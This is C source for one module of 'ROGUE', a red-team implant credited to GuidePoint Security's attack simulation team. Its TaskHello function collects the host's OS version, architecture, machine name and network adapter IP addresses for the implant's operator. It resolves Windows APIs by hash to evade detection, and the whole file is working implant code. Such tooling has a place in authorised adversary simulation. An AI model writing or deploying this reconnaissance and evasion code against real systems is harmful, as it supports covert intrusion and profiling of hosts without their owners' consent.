/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32	OsMajorVersion;
	UINT32	OsMinorVersion;
	UINT8	IsAdmin;
	UINT8	Is64;
} TASK_HELLO_BUF;

typedef struct
{
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Requests implant and host information. Ignores
 * Buffer and Length as it is not needed.
 *
!*/
D_SEC( B ) BOOL TaskHello( _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER Output )
{
	API			Api;
	TASK_HELLO_BUF		Thb;

	BOOL			Ret = FALSE;

	PCHAR			Dsk = NULL;
	PBUFFER			Out = NULL;
	PIP_ADAPTER_INFO	Nxt = NULL;
	PIP_ADAPTER_INFO	Pai = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );

	/* Create initial struct */
	Thb.OsMajorVersion = NtCurrentPeb()->OSMajorVersion;
	Thb.OsMinorVersion = NtCurrentPeb()->OSMinorVersion;
	Thb.IsAdmin        = FALSE;
#if defined( _WIN64 )
	Thb.Is64           = TRUE; 
#else
	Thb.Is64	   = FALSE;
#endif

	/* Init API */
	Api.RtlFreeHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Create buffer to hold information */
	if ( ( Out = BufferCreate() ) != NULL ) {
		/* Insert start of buffer */
		if ( BufferAddRaw( Out, &Thb, sizeof( Thb ) ) ) {
			/* Desktop name? */
			if ( ( Dsk = OsMachineName() ) != NULL ) {
				if ( ( Pai = OsIpAddress() ) != NULL ) {
					/* Append the desktop name and string */
					if ( BufferPrintf( Out, C_PTR( G_PTR( "%s\t" ) ), Dsk ) ) {
						/* Enumerate individual entries */
						for ( Nxt = C_PTR( Pai ) ; Nxt != NULL ; Nxt = Nxt->Next ) {
							/* Does not contain 0.0.0.0? */
							if ( HashString( Nxt->IpAddressList.IpAddress.String, 0 ) != 0xe176f26f ) {
								/* Insert the interface name and string */
								BufferPrintf( Out, C_PTR( G_PTR( "%s:%s;" ) ), Nxt->Description, Nxt->IpAddressList.IpAddress.String );
							};
						};
						Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );
					};
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Pai );
					Pai = NULL;
				};
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dsk );
				Dsk = NULL;
			};
		};
		/* Cleanup */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
		Out = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );

	/* Success or fail! */
	return Ret;
};
